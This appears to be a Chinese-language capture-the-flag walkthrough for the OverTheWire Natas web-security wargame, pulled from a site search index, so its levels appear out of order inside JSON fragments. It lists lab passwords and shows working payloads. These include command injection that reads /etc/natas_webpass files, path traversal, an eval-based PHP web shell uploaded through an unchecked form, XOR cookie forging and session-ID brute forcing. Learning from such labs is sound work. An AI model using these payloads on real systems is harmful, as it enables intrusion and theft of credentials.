xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP URL http://natas18.natas.labs.overthewire.org \u63d0\u793a\u9700\u8981\u4f7f\u7528\u7ba1\u7406\u5458\u8d26\u53f7\u767b\u5f55\u624d\u80fd\u83b7\u5f97\u4e0b\u4e00\u5173\u53e3\u4ee4 \u539f\u672c\u7ba1\u7406\u5458\u662f\u901a\u8fc7\u7528\u6237\u540d\u6765\u5224\u65ad\uff0c\u4f46\u7531\u4e8e\u8fd9\u79cd\u65b9\u6cd5\u4e0d\u5b89\u5168\uff0c isValidAdminLogin() \u4e2d\u7684\u5173\u952e\u8bed\u53e5\u88ab\u6ce8\u91ca\uff0c\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u4f1a\u8fd4\u56de 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas18 </ h1 > < div id = \"content\" > <? # \u8fd9\u91cc\u6709\u70b9\u610f\u601d\uff0c640 \u660e\u663e\u5f88\u5c0f\u8036 (\u014f\u03c9\u014f) $maxid = 640; // 640 should be enough for everyone function isValidAdminLogin() { /* {{{ */ if($_REQUEST[\"username\"] == \"admin\") { /* This method of authentication appears to be unsafe and has been disabled for now. */ //return 1; } return 0; } /* }}} */ function isValidID($id) { /* {{{ */ return is_numeric($id); } /* }}} */ function createID($user) { /* {{{ */ global $maxid; return rand(1, $maxid); } /* }}} */ function debug($msg) { /* {{{ */ if(array_key_exists(\"debug\", $_GET)) { print \"DEBUG: $msg<br>\"; } } /* }}} */ function my_session_start() { /* {{{ */ if(array_key_exists(\"PHPSESSID\", $_COOKIE) and isValidID($_COOKIE[\"PHPSESSID\"])) { if(!session_start()) { debug(\"Session start failed\"); return false; } else { debug(\"Session start ok\"); if(!array_key_exists(\"admin\", $_SESSION)) { debug(\"Session was old: admin flag set\"); $_SESSION[\"admin\"] = 0; // backwards compatible, secure } return true; } } return false; } /* }}} */ function print_credentials() { /* {{{ */ if($_SESSION and array_key_exists(\"admin\", $_SESSION) and $_SESSION[\"admin\"] == 1) { print \"You are an admin. The credentials for the next level are:<br>\"; print \"<pre>Username: natas19\\n\"; print \"Password: <censored></pre>\"; } else { print \"You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.\"; } } /* }}} */ $showform = true; if(my_session_start()) { print_credentials(); $showform = false; } else { if(array_key_exists(\"username\", $_REQUEST) && array_key_exists(\"password\", $_REQUEST)) { session_id(createID($_REQUEST[\"username\"])); session_start(); $_SESSION[\"admin\"] = isValidAdminLogin(); debug(\"New session started\"); $showform = false; print_credentials(); } } if($showform) { ?> < p > Please login with your admin account to retrieve credentials for natas19. </ p > < form action = \"index.php\" method = \"POST\" > Username: < input name = \"username\" >< br > Password: < input name = \"password\" >< br > < input type = \"submit\" value = \"Login\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u7528\u6237\u7684 PHPSESSID \u662f\u8303\u56f4\u5728 \\([1, 640]\\) \uff0c\u90a3\u4e48\u53ea\u8981\u66b4\u529b\u627e\u5230 admin \u7684 PHPSESSID \u5c31\u597d\u4e86(<\u309d\u03c9\u03a6) Level 19 \u00b6 Username natas19 Password 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs URL http://natas19.natas.labs.overthewire.org session ID \u4e0d\u518d\u8fde\u7eed\u4e86\u2026\u2026 \u901a\u8fc7\u89c2\u5bdf\u53d1\u73b0\uff0c\u65b0\u7684 PHPSESSID \u7684\u683c\u5f0f\u4e3a \u968f\u673a1~3\u4f4d\u6570\u5b57 + \"-\" + \u7528\u6237\u540d \u7684 ASCII \u7801\u5b57\u7b26\u4e32 \u63a5\u4e0b\u6765\u5c31\u662f\u66b4\u529b\u679a\u4e3e 1 \u81f3 3 \u4f4d\u7684\u968f\u673a\u6570\u5b57 \u7ecf\u8fc7\u5f88\u957f\u4e00\u6bb5\u65f6\u95f4\u7684\u679a\u4e3e\u2026\u2026(<\u309d\u03c9\u03a6)","title":"Natas"},{"location":"wargames/natas/#level-0","text":"Username natas0 Password natas0 URL http://natas0.natas.labs.overthewire.org \u63d0\u793a\uff1a You can find the password for the next level on this page. \u4f7f\u7528\u5f00\u53d1\u8005\u5de5\u5177\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u5373\u53ef\u83b7\u5f97\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4","title":"Level 0"},{"location":"wargames/natas/#level-1","text":"Username natas1 Password gtVrDuiDfck831PqWsLEZy5gyDz1clto URL http://natas1.natas.labs.overthewire.org \u63d0\u793a\uff1a You can find the password for the next level on this page, but rightclicking has been blocked! \uff08\u4f46\u662f\u5495\u5495\u51e0\u4e4e\u4e0d\u600e\u4e48\u7528\u53f3\u952e\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u7684(\u256e\u014f\u03c9\u014f)\u256d\uff09 \u4f7f\u7528\u5f00\u53d1\u8005\u5de5\u5177\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\u5373\u53ef\u83b7\u5f97\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4","title":"Level 1"},{"location":"wargames/natas/#level-2","text":"Username natas2 Password ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi URL http://natas2.natas.labs.overthewire.org \u63d0\u793a\uff1a There is nothing on this page \u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u4f7f\u7528\u4e86\u4e00\u5f20 files \u8def\u5f84\u4e0b\u7684\u56fe\u7247\uff08\u56e0\u4e3a\u53ea\u6709 1X1 \u7684\u5927\u5c0f\uff0c\u6240\u4ee5\u9875\u9762\u4e0a\u770b\u4e0d\u5230\uff09 \u8bbf\u95ee http://natas2.natas.labs.overthewire.org/files \uff0c\u53d1\u73b0\u8be5\u8def\u5f84\u4e0b\u8fd8\u6709\u4e00\u4e2a users.txt \u6587\u4ef6\uff0c\u67e5\u770b\u8be5\u6587\u4ef6\u83b7\u5f97\u7528\u6237 natas3 \u7684\u53e3\u4ee4 1 2 3 4 5 6 7 # username:password alice:BYNdCesZqW bob:jw2ueICLvT charlie:G5vCxkVV3m natas3:sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 eve:zo4mJWyNj2 mallory:9urtcpzBmH","title":"Level 2"},{"location":"wargames/natas/#level-3","text":"Username natas3 Password sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14 URL http://natas3.natas.labs.overthewire.org \u8fd9\u6b21\u9875\u9762\u4e0a\u4f9d\u7136\u662f There is nothing on this page \uff0c\u67e5\u770b\u9875\u9762\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u4e00\u6bb5\u6ce8\u91ca\u4fe1\u606f\uff1a No more information leaks!! Not even Google will find it this time... \u55ef\uff1f\u600e\u4e48\u80fd\u8ba9\u8c37\u6b4c\u6293\u53d6\u4e0d\u5230\u7f51\u7ad9\u7684\uff1f \u7f51\u7ad9\u6240\u6709\u8005\u53ef\u4ee5\u8be6\u7ec6\u89c4\u5b9a\u5904\u7406\u5176\u7f51\u9875\u7684\u65b9\u5f0f\uff0c\u7533\u8bf7\u91cd\u65b0\u6293\u53d6\uff0c\u6216\u4f7f\u7528 robots.txt \u6587\u4ef6\u5b8c\u5168\u7981\u6b62\u8c37\u6b4c\u6293\u53d6\u5de5\u5177\u6293\u53d6\u4ed6\u4eec\u7684\u7f51\u7ad9 \u8bbf\u95ee http://natas3.natas.labs.overthewire.org/robots.txt \uff0c\u67e5\u770b robots.txt \u6587\u4ef6 1 2 3 # \u7981\u6b62\u6240\u6709\u722c\u866b\u722c\u53d6\u8def\u5f84 /s3cr3t User-agent: * Disallow: /s3cr3t/ \u76ee\u6807\u6307\u5411 http://natas3.natas.labs.overthewire.org/s3cr3t/ \uff0c\u8bbf\u95ee\u53ef\u67e5\u770b\u5230\u8be5\u8def\u5f84\u4e0b\u7684\u4e00\u4e2a users.txt \u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4 1 natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ","title":"Level 3"},{"location":"wargames/natas/#_1","text":"Google \u641c\u7d22\u7684\u5de5\u4f5c\u65b9\u5f0f | \u6293\u53d6\u548c\u7f16\u5165\u7d22\u5f15 Robots.txt Specifications | Search for Developers | Google Developers","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/natas/#level-4","text":"Username natas4 Password Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ URL http://natas4.natas.labs.overthewire.org \u8fdb\u5165\u540e\u63d0\u793a \u70b9\u51fb Refresh page \u540e\uff0c\u4ece http://natas4.natas.labs.overthewire.org \u8fdb\u5165 http://natas4.natas.labs.overthewire.org/index.php \uff0c\u4e14\u63d0\u793a\u6587\u672c\u53d1\u751f\u53d8\u5316 \u5728 HTTP \u8bf7\u6c42\u5934\u4e2d\u5305\u542b Referer \u5b57\u6bb5\uff0c\u7528\u4e8e\u6807\u8bc6\u8bbf\u95ee\u6765\u6e90\uff0c\u63d0\u793a\u4fe1\u606f\u4e2d visit from \u7684\u610f\u4e49\u4e0e\u503c\u5747\u4e0e Referer \u5b57\u6bb5\u76f8\u540c\uff0c\u90a3\u4e48\u5c06 Referer \u5b57\u6bb5\u7684\u503c\u6539\u4e3a http://natas5.natas.labs.overthewire.org/ \uff0c\u518d\u6b21\u53d1\u9001 HTTP \u8bf7\u6c42\u5373\u53ef","title":"Level 4"},{"location":"wargames/natas/#level-5","text":"Username natas5 Password iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq URL http://natas5.natas.labs.overthewire.org \u8fdb\u5165\u540e\u63d0\u793a\u6ca1\u6709\u767b\u5f55\uff01(\u2565\u03c9\u2565) \u67e5\u770b HTTP \u8bf7\u6c42\u5934\uff0c\u53d1\u73b0 Cookie \u5b57\u6bb5\u4e3a loggedin=0 \uff0c\u975e\u5e38\u53ef\u7591(\u2014\u02cb\u03c9\u02ca\u2014)\uff01 \u5c06 loggedin=0 \u4fee\u6539\u4e3a loggedin=1 \u5e76\u53d1\u9001 HTTP \u8bf7\u6c42\uff0c\u6210\u529f\u767b\u5f55\uff01","title":"Level 5"},{"location":"wargames/natas/#level-6","text":"Username natas6 Password aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1 URL http://natas6.natas.labs.overthewire.org \u51fa\u73b0\u8f93\u5165\u6846\u4e86\uff01 \u5148\u770b\u770b\u6e90\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas6 </ h1 > < div id = \"content\" > <? include \"includes/secret.inc\"; # \u4f7f\u7528\u7684\u662f\u76f8\u5bf9\u8def\u5f84 if(array_key_exists(\"submit\", $_POST)) { # \u9700\u8981\u77e5\u9053 $secret \u7684\u503c if($secret == $_POST['secret']) { print \"Access granted. The password for natas7 is <censored>\"; } else { print \"Wrong secret\"; } } ?> < form method = post > Input secret: < input name = secret >< br > < input type = submit name = submit > </ form > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u6ce8\u610f\u5230 include \u6587\u4ef6\u4f7f\u7528\u7684\u662f\u76f8\u5bf9\u8def\u5f84\uff0c\u8bbf\u95ee http://natas6.natas.labs.overthewire.org/includes/secret.inc \uff0c\u5728\u7f51\u9875\u6e90\u4ee3\u7801\u4e2d\u770b\u5230\u53d8\u91cf $secret \u7684\u503c \u56de\u5230 http://natas6.natas.labs.overthewire.org \uff0c\u8f93\u5165\u5bc6\u7801\uff0c\u83b7\u5f97 natas7 \u7684\u53e3\u4ee4","title":"Level 6"},{"location":"wargames/natas/#level-7","text":"Username natas7 Password 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9 URL http://natas7.natas.labs.overthewire.org \u9996\u9875\u7ed9\u51fa\u4e86 Home \u548c About \u9875\u9762\u7684\u94fe\u63a5\uff0c\u5e76\u63d0\u793a natas8 \u7684\u53e3\u4ee4\u5b58\u50a8\u5728 /etc/natas_webpass/natas8 \u901a\u8fc7 GET \u65b9\u5f0f\u4f20\u9012\u53c2\u6570\u7ed9 index.php \uff0c\u90a3\u4e48\u9664\u4e86 home \u548c about \uff0c\u968f\u4fbf\u4f20\u4e00\u4e2a\u503c\u8bd5\u8bd5\u53ed(\u2014\u02cb\u03c9\u02ca\u2014) include() \u9996\u5148\u67e5\u770b\u4f20\u5165\u7684\u6587\u4ef6\u8def\u5f84\uff08\u7531\u4e0a\u56fe\u53ef\u77e5\uff0c\u4f20\u5165 include() \u51fd\u6570\u7684\u53c2\u6570\u5373\u4e3a page \u53d8\u91cf\u7684\u503c\uff09\uff0c\u5176\u6b21\u67e5\u770b\u5b9a\u4e49\u7684 include_path \uff0c\u6700\u540e\u68c0\u67e5\u8c03\u7528\u811a\u672c\u6240\u5728\u7684\u76ee\u5f55\u548c\u5f53\u524d\u5de5\u4f5c\u76ee\u5f55\u3002\u90a3\u4e48\u53ef\u901a\u8fc7 page=/etc/natas_webpass/natas8 \u6216 page=../../../../etc/natas_webpass/natas8 \u6765\u83b7\u5f97\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4","title":"Level 7"},{"location":"wargames/natas/#_2","text":"PHP: include - Manual","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/natas/#level-8","text":"Username natas8 Password DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe URL http://natas8.natas.labs.overthewire.org \u518d\u6b21\u51fa\u73b0\u8f93\u5165\u6846\uff0c\u5148\u67e5\u770b\u6e90\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas8 </ h1 > < div id = \"content\" > <? $encodedSecret = \"3d3d516343746d4d6d6c315669563362\"; function encodeSecret($secret) { return bin2hex(strrev(base64_encode($secret))); } # \u8f93\u5165\u7ecf\u8fc7 Base64 \u7f16\u7801\u3001\u5b57\u7b26\u4e32\u53cd\u8f6c\uff0c\u6700\u540e\u8f6c\u5316\u4e3a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32 # \u7ed3\u679c\u8981\u4e0e $encodedSecret \u76f8\u7b49 if(array_key_exists(\"submit\", $_POST)) { if(encodeSecret($_POST['secret']) == $encodedSecret) { print \"Access granted. The password for natas9 is <censored>\"; } else { print \"Wrong secret\"; } } ?> < form method = post > Input secret: < input name = secret >< br > < input type = submit name = submit > </ form > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u5bf9 $encodedSecret \u8fdb\u884c\u9006\u64cd\u4f5c\uff0c\u4ee5\u5f97\u5230\u8981\u63d0\u4ea4\u7684 secret \u7684\u503c 1 2 $ echo 0x3d3d516343746d4d6d6c315669563362 | xxd -r | rev | base64 -d oubWYf2kBq \u63d0\u4ea4\u5373\u53ef\u83b7\u53d6\u53e3\u4ee4","title":"Level 8"},{"location":"wargames/natas/#level-9","text":"Username natas9 Password W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl URL http://natas9.natas.labs.overthewire.org \u8981\u6c42\u7684\u8f93\u5165\u53d1\u751f\u53d8\u5316\u4e86 \u603b\u4e4b\u5148\u67e5\u770b\u6e90\u4ee3\u7801 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas9 </ h1 > < div id = \"content\" > < form > Find words containing: < input name = needle >< input type = submit name = submit value = Search >< br >< br > </ form > Output: < pre > <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { passthru(\"grep -i $key dictionary.txt\"); } ?> </ pre > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u8f93\u5165\u6ca1\u6709\u7ecf\u8fc7\u4efb\u4f55\u5904\u7406\u76f4\u63a5\u653e\u5230\u547d\u4ee4\u5b57\u7b26\u4e32\u91cc\u4e86\uff01\u8fd9\u6837\u4e00\u6765\uff0c\u53ef\u5c31\u4e0d\u80fd\u53ea\u6267\u884c\u4e00\u4e2a\u547d\u4ee4\u4e86\u54e6~\ud83d\udc7f\u63d0\u4ea4 ;cat /etc/natas_webpass/natas10 # \uff0c\u62fc\u63a5\u540e\u7684\u547d\u4ee4\u5982\u4e0b 1 grep -i ; cat /etc/natas_webpass/natas10 # dictionary.txt \u6210\u529f\u83b7\u5f97\u4e0b\u4e00\u5173\u7684\u53e3\u4ee4","title":"Level 9"},{"location":"wargames/natas/#level-10","text":"Username natas10 Password nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu URL http://natas10.natas.labs.overthewire.org \u8fd9\u56de\u4f1a\u8fc7\u6ee4\u6389\u4e00\u4e9b\u5b57\u7b26(\u014f\u03c9\u014f) \u901a\u8fc7\u6e90\u4ee3\u7801\uff0c\u53d1\u73b0\u5206\u9694\u7b26\u88ab\u8fc7\u6ee4\u6389\u4e86(\u2565\u03c9\u2565) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas10 </ h1 > < div id = \"content\" > For security reasons, we now filter on certain characters < br />< br /> < form > Find words containing: < input name = needle >< input type = submit name = submit value = Search >< br >< br > </ form > Output: < pre > <? $key = \"\"; if(array_key_exists(\"needle\", $_REQUEST)) { $key = $_REQUEST[\"needle\"]; } if($key != \"\") { # \u8fc7\u6ee4\u6389\u4e86\u5206\u9694\u7b26 if(preg_match('/[;|&]/',$key)) { print \"Input contains an illegal character!\"; } else { passthru(\"grep -i $key dictionary.txt\"); } } ?> </ pre > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u4e0d\u8fc7\uff0c grep \u53ef\u4ee5\u540c\u65f6\u5904\u7406\u591a\u4e2a\u6587\u4ef6\uff0c\u90a3\u4e48\u53ea\u8981\u731c\u6d4b /etc/natas_webpass/natas11 \u6587\u4ef6\u5185\u5bb9\u4e2d\u7684\u4e00\u4e2a\u5b57\u7b26\u5c31\u53ef\u4ee5\u5566~\uff08\u63a8\u8350\u731c\u6570\u5b57(<\u309d\u03c9\u03a6)\uff0c 0-9 \u5c31\u53ef\u4ee5\uff0c\u540c\u65f6 dictionary.txt \u6587\u4ef6\u4e2d\u4e5f\u4e0d\u542b\u6570\u5b57\uff09 Usage: grep [OPTION]... PATTERN [FILE]... \u63d0\u4ea4 1 /etc/natas_webpass/natas11 \uff0c\u60ca\u559c\uff01","title":"Level 10"},{"location":"wargames/natas/#level-11","text":"Username natas11 Password U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK URL http://natas11.natas.labs.overthewire.org \u53ef\u4ee5\u901a\u8fc7\u8868\u5355\u63d0\u4ea4\u5e76\u8bbe\u7f6e\u80cc\u666f\u989c\u8272\uff0c\u63d0\u793a\uff1a Cookies \u53d7\u5f02\u6216\u52a0\u5bc6\u4fdd\u62a4 \uff1f \u67e5\u770b\u7f51\u9875\u6e90\u4ee3\u7801\uff0c\u4e86\u89e3\u5230\u9700\u8981\u901a\u8fc7 Cookie \u8bbe\u7f6e showpassword \u7684\u503c\u4e3a yes 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > <? # \u53d8\u91cf $defaultdata \u4e2d showpassword \u7684\u521d\u59cb\u503c\u4e3a no $defaultdata = array( \"showpassword\"=>\"no\", \"bgcolor\"=>\"#ffffff\"); function xor_encrypt($in) { $key = '<censored>'; $text = $in; $outText = ''; // Iterate through each character for($i=0;$i<strlen($text);$i++) { # \u5f02\u6216\u8fd0\u7b97\uff0c\u53ef\u901a\u8fc7\u5c06\u8f93\u5165\u548c\u8f93\u51fa\u5f02\u6216\u5f97\u5230\u53d8\u91cf $key $outText .= $text[$i] ^ $key[$i % strlen($key)]; } return $outText; } function loadData($def) { # HTTP \u8bf7\u6c42\u5934\u4e2d\u5305\u542b\u7684 Cookie \u4e3b\u8981\u7528\u4e8e\u4f20\u9012 showpassword \u7684\u503c global $_COOKIE; $mydata = $def; if(array_key_exists(\"data\", $_COOKIE)) { $tempdata = json_decode(xor_encrypt(base64_decode($_COOKIE[\"data\"])), true); if(is_array($tempdata) && array_key_exists(\"showpassword\", $tempdata) && array_key_exists(\"bgcolor\", $tempdata)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $tempdata['bgcolor'])) { $mydata['showpassword'] = $tempdata['showpassword']; $mydata['bgcolor'] = $tempdata['bgcolor']; } } } return $mydata; } # \u4fdd\u5b58\u5230 Cookie \u4e2d function saveData($d) { setcookie(\"data\", base64_encode(xor_encrypt(json_encode($d)))); } # \u5c06 Cookie \u7684\u503c\u7ecf\u8fc7 Base64 \u89e3\u7801\u3001\u4e0e\u5bc6\u94a5\u5f02\u6216\u5e76\u8f6c\u5316\u4e3a json \u683c\u5f0f\u8d4b\u503c\u7ed9\u53d8\u91cf $data $data = loadData($defaultdata); # \u63a5\u6536\u901a\u8fc7 GET \u8bf7\u6c42\uff08\u8868\u5355\uff09\u63d0\u4ea4\u7684\u80cc\u666f\u989c\u8272\u5e76\u8bbe\u7f6e if(array_key_exists(\"bgcolor\",$_REQUEST)) { if (preg_match('/^#(?:[a-f\\d]{6})$/i', $_REQUEST['bgcolor'])) { $data['bgcolor'] = $_REQUEST['bgcolor']; } } saveData($data); ?> < h1 > natas11 </ h1 > < div id = \"content\" > < body style = \"background: <?=$data['bgcolor']?>;\" > Cookies are protected with XOR encryption < br />< br /> <? # \u9700\u8981\u5f97\u5230\u5305\u542b $data[\"showpassword\"] == \"yes\" \u5bf9\u5e94\u7684 Cookie if($data[\"showpassword\"] == \"yes\") { print \"The password for natas12 is <censored><br>\"; } ?> < form > Background color: < input name = bgcolor value = \"<?=$data['bgcolor']?>\" > < input type = submit value = \"Set color\" > </ form > < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u76f4\u63a5\u63d0\u4ea4\u8868\u5355\uff0c\u83b7\u5f97\u53d8\u91cf $defaultdata \u5bf9\u5e94\u7684 Cookie \u901a\u8fc7\u5f02\u6216\u83b7\u5f97\u53d8\u91cf $key \u7684\u503c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 <?php # calc.php $defaultdata = array ( \"showpassword\" => \"no\" , \"bgcolor\" => \"#ffffff\" ); $data = \"ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=\" ; function xor_encrypt ( $in , $out ) { $outText = '' ; for ( $i = 0 ; $i < strlen ( $in ); $i ++ ) { $outText .= $in [ $i ] ^ $out [ $i % strlen ( $out )]; } return $outText ; } echo xor_encrypt ( base64_decode ( $data ), json_encode ( $defaultdata )); ?> \u5faa\u73af\u8282\u957f\u5ea6\u4e3a 4\uff0c\u8f7b\u677e\u83b7\u5f97 $key \u503c\uff1a qw8J 1 2 $ php -f calc.php qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq \u63a5\u4e0b\u6765\u83b7\u53d6\u76ee\u6807 Cookie 1 2 $ php -f calc.php ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 <?php # calc.php $targetdata = array ( \"showpassword\" => \"yes\" , \"bgcolor\" => \"#ffffff\" ); function xor_encrypt ( $in ) { $key = 'qw8J' ; $text = $in ; $outText = '' ; for ( $i = 0 ; $i < strlen ( $text ); $i ++ ) { $outText .= $text [ $i ] ^ $key [ $i % strlen ( $key )]; } return $outText ; } echo base64_encode ( xor_encrypt ( json_encode ( $targetdata ))); ?> \u7f16\u8f91\u539f HTTP \u8bf7\u6c42\u5934\u4e2d\u7684 Cookie \u7684\u503c\uff0c\u5e76\u518d\u6b21\u53d1\u9001\uff0c\u6210\u529f\u83b7\u53d6\u4e0b\u4e00\u5173\u53e3\u4ee4","title":"Level 11"},{"location":"wargames/natas/#level-12","text":"Username natas12 Password EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3 URL http://natas12.natas.labs.overthewire.org \u8868\u5355\uff1a\u4e0a\u4f20 JPEG \u6587\u4ef6 \u67e5\u770b\u6e90\u4ee3\u7801\uff0c\u6ce8\u610f\u5230\u5e76\u6ca1\u6709\u5bf9\u4e0a\u4f20\u6587\u4ef6\u8fdb\u884c\u7c7b\u578b\u68c0\u67e5\uff08\u5305\u62ec\u6587\u4ef6\u540e\u7f00\u540d\uff09\uff0c\u4e0a\u4f20\u5230\u670d\u52a1\u5668\u540e\uff0c\u6587\u4ef6\u540d\u662f\u968f\u673a\u751f\u6210\u7684\u5b57\u7b26\u4e32\uff0c\u6587\u4ef6\u540e\u7f00\u540d\u5219\u7531\u524d\u7aef\u76f4\u63a5\u5b9a\u4e49 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 < html > < head > <!-- This stuff in the header has nothing to do with the level --> </ head > < body > < h1 > natas12 </ h1 > < div id = \"content\" > <? # \u751f\u6210\u957f\u5ea6\u4e3a 10 \u7684\u968f\u673a\u5b57\u7b26\u4e32 function genRandomString() { $length = 10; $characters = \"0123456789abcdefghijklmnopqrstuvwxyz\"; $string = \"\"; for ($p = 0; $p < $length; $p++) { $string .= $characters[mt_rand(0, strlen($characters)-1)]; } return $string; } function makeRandomPath($dir, $ext) { do { $path = $dir.\"/\".genRandomString().\".\".$ext; } while(file_exists($path)); return $path; } function makeRandomPathFromFilename($dir, $fn) { # \u83b7\u5f97\u4f20\u5165\u8def\u5f84\u5b57\u7b26\u4e32\u4e2d\u7684\u6587\u4ef6\u6269\u5c55\u540d $ext = pathinfo($fn, PATHINFO_EXTENSION); return makeRandomPath($dir, $ext); } if(array_key_exists(\"filename\", $_POST)) { $target_path = makeRandomPathFromFilename(\"upload\", $_POST[\"filename\"]); if(filesize($_FILES['uploadedfile']['tmp_name']) > 1000) { echo \"File is too big\"; } else { if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_path)) { echo \"The file <a href=\\\"$target_path\\\">$target_path</a> has been uploaded\"; } else{ echo \"There was an error uploading the file, please try again!\"; } } } else { ?> < form enctype = \"multipart/form-data\" action = \"index.php\" method = \"POST\" > < input type = \"hidden\" name = \"MAX_FILE_SIZE\" value = \"1000\" /> <!-- \u76f4\u63a5\u5b9a\u4e49\u6587\u4ef6\u540e\u7f00\u540d\u3002\u6b64\u5904\u663e\u793a\u7684\u6587\u4ef6\u540d\u65e0\u6548 --> < input type = \"hidden\" name = \"filename\" value = \"<? print genRandomString(); ?>.jpg\" /> Choose a JPEG to upload (max 1KB): < br /> < input name = \"uploadedfile\" type = \"file\" />< br /> < input type = \"submit\" value = \"Upload File\" /> </ form > <? } ?> < div id = \"viewsource\" >< a href = \"index-source.html\" > View sourcecode </ a ></ div > </ div > </ body > </ html > \u521b\u5efa\u5e76\u7f16\u8f91\u6587\u4ef6 hack.php 1 <?php @ eval ( $_POST [ 'pass' ]); ?> \u4fee\u6539\u524d\u7aef\u8868\u5355\uff0c\u5c06\u6587\u4ef6\u540e\u7f00 jpg \u6539\u4e3a php \uff0c\u5e76\u4e0a\u4f20\u6587\u4ef6 hack.php \u4fdd\u5b58\u6587\u4ef6\u94fe\u63a5 \u5148\u4f7f\u7528\u4e2d\u56fd\u83dc\u5200\u6d4f\u89c8\u5668\u8bbf\u95ee http://natas12.natas.labs.overthewire.org \uff0c\u5b8c\u6210\u8eab\u4efd\u9a8c\u8bc1 \u6dfb\u52a0SHELL \u8fdb\u5165\u6587\u4ef6\u7cfb\u7edf\u540e\uff0c\u627e\u5230 /etc/natas_webpass/natas13 \u5373\u53ef","title":"Level 12"},{"location":"wargames/natas/#level-13","text":"Username natas13 Password jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY URL http://natas13.natas.labs.overthewire.org \u9875\u9762\u63d0\u793a\u53ea\u63a5\u6536\u56fe\u7247\u6587\u4ef6 \u6e90\u7801\u4e2d\u4f7f\u7528 exif_imagetype \u51fd\u6570\u5224\u65ad\u4e0a\u4f20\u7684\u6587\u4ef6\u662f\u5426\u4e3a\u56fe\u7247\uff08\u8fd4\u56de FALSE \u6216\u56fe\u7247\u7c7b\u578b\uff09\uff0c exif_imagetype 